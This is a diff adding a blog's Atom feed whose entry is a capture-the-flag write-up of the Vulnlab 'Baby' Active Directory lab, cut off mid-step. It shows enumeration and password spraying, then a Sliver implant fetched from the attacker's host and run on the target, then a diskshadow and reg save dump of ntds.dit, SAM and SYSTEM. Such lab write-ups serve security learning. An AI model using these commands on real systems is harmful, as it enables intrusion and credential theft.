@@ -1,0 +1,946 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-19T15:17:05+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Baby [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html" rel="alternate" type="text/html" title="Vulnlab - Baby [Easy]" /><published>2023-12-18T00:00:00+02:00</published><updated>2023-12-18T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html">&lt;p&gt;Recently I’ve started to explore more platforms for hacking different type of boxes and I found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct&lt;/code&gt; has created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnlab&lt;/code&gt;. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.&lt;/p&gt;
+
+&lt;p&gt;https://www.vulnlab.com/&lt;/p&gt;
+
+&lt;h1 id=&quot;user--initial-foothold&quot;&gt;User / Initial Foothold&lt;/h1&gt;
+
+&lt;p&gt;Started with a nmap scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; 4 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; vuln&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.txt &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    &lt;span class=&quot;nb&quot;&gt;bind
+&lt;/span&gt;135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: baby.vl0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+49664/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+59647/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.80%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12/17%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;657F4FC2%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DNS
+SF:VersionBindReqTCP,20,&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07version
+SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04bind&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+Service Info: Host: BABYDC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baby.vl&lt;/code&gt;, I will add this to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. After that, I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enum4linux&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;(I will post only the interesting results)&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;enum4linux &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
+...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying LDAP
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Appears to be root/parent DC
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Long domain name is: baby.vl
+...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found domain information via SMB
+NetBIOS computer name: BABYDC
+NetBIOS domain name: BABY
+DNS domain: baby.vl
+FQDN: BabyDC.baby.vl
+Derived membership: domain member
+Derived domain: BABY
+...
+Server allows session using username &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;
+...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain: BABY
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Membership: domain member
+...
+OS: Windows 10, Windows Server 2019, Windows Server 2016
+OS version: &lt;span class=&quot;s1&quot;&gt;&apos;10.0&apos;&lt;/span&gt;
+OS release: &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;
+OS build: &lt;span class=&quot;s1&quot;&gt;&apos;20348&apos;&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-LLL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base &lt;span class=&quot;s1&quot;&gt;&apos;(objectclass=*)&apos;&lt;/span&gt;
+...
+rootDomainNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;baby,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vl
+ldapServiceName: baby.vl:babydc&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;BABY.VL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This didn’t yield that much information but we can search for the specific domain components (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baby,vl&lt;/code&gt;)&lt;/p&gt;
+
+&lt;p&gt;(Only the interesting information)&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=baby,DC=vl&quot;&lt;/span&gt;
+...
+&lt;span class=&quot;c&quot;&gt;# Teresa Bell, it, baby.vl&lt;/span&gt;
+dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Teresa Bell,OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;it,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;baby,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vl
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Teresa Bell
+sn: Bell
+description: Set initial password to BabyStart123!
+...
+&amp;lt;other &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we’ve learned that the initial password for the users is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BabyStart123!&lt;/code&gt;, we can save all the found users under users.txt and try the password against all of them with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netexec&lt;/code&gt; (previously &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netexec smb &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ./users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./passwords.txt 
+SMB         10.10.83.68     445    BABYDC           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:BABYDC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:baby.vl&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+...
+SMB         10.10.10.6      445    BABYDC           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] baby.vl&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;aroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We found that the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caroline.robinson&lt;/code&gt; has the status &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_PASSWORD_MUST_CHANGE&lt;/code&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbpasswd.py&lt;/code&gt; from the impacket scripts to change the password.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 smbpasswd.py baby.vl/Caroline.Robinson:&lt;span class=&quot;s1&quot;&gt;&apos;BabyStart123!&apos;&lt;/span&gt;@&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newpass&lt;/span&gt; Summer2018!
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Password is expired, trying to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;with a null session.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Password was changed successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, let’s try to use WinRM to log in to the machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Caroline.Robinson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Summer2018!&apos;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;aroline.Robinson&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;aroline.Robinson&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ..&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
+VL&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;root--privilege-escalation&quot;&gt;Root / Privilege Escalation&lt;/h1&gt;
+
+&lt;p&gt;Since I highly dislike &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up &lt;a href=&quot;https://github.com/BishopFox/sliver&quot;&gt;SilverC2&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec$ silversrv
+
+          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
+        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
+        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
+                  ░      ░  ░ ░        ░     ░  ░   ░
+
+All hackers gain fear
+[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
+[*] Welcome to the sliver shell, please type &apos;help&apos; for options
+
+[*] Check for updates with the &apos;update&apos; command
+
+[server] sliver &amp;gt; generate --mtls tun0:8888
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 39s
+[*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, that I have an implant, I’ve transferred it to the server with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\TEMP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iwr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myIp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8000/EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\TEMP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\EXISTING_CROTCH.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’ve set up a listener and once I invoke the implant on the machine I will get a session on my server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BabyDC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I’ve started to enumerate the privileges first.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[server] sliver (EXISTING_CROTCH) &amp;gt; getprivs
+
+Privilege Information for EXISTING_CROTCH.exe (PID: 3248)
+---------------------------------------------------------
+
+Process Integrity Level: High
+
+Name                            Description                     Attributes
+====                            ===========                     ==========
+SeMachineAccountPrivilege       Add workstations to domain      Enabled, Enabled by Default
+SeBackupPrivilege               Back up files and directories   Enabled, Enabled by Default
+SeRestorePrivilege              Restore files and directories   Enabled, Enabled by Default
+SeShutdownPrivilege             Shut down the system            Enabled, Enabled by Default
+SeChangeNotifyPrivilege         Bypass traverse checking        Enabled, Enabled by Default
+SeIncreaseWorkingSetPrivilege   Increase a process working set  Enabled, Enabled by Default
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And I noticed that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeBackupPrivilege&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeRestorePrivilege&lt;/code&gt; privilege enabled, that automatically means that we can abuse those to get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntds.dit,SAM,SYSTEM&lt;/code&gt; files to obtain some hashes that we can use further to escalate our privileges.&lt;/p&gt;
+
+&lt;p&gt;There are a lot of resources for this technique, here are some of my favorite reads:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960&lt;/li&gt;
+  &lt;li&gt;https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup&lt;/li&gt;
+  &lt;li&gt;https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I created a file on my local system called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl.dsh&lt;/code&gt; which is basically a script file that can execute series of commands, the contents is as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;persistent&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;nowriters&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;volume&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;c&lt;/span&gt;: &lt;span class=&quot;kd&quot;&gt;alias&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;syl&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;create&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;expose&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;%syl%&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;z&lt;/span&gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This sets the context to be persistent, so that the shadow copies will be kept after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diskshadow&lt;/code&gt; session is closed. Then we add a shadowcopy of the C:\ drive with the alias &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl&lt;/code&gt;, we create it and we expose it as another drive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Z:&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we can download the shadow copy of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntds&lt;/code&gt; file using the SilverC2’s interactive mode.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download Z:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we also need the SYSTEM and SAM files, which we can get by invoking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reg&lt;/code&gt; utility.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am c:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem c:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download system
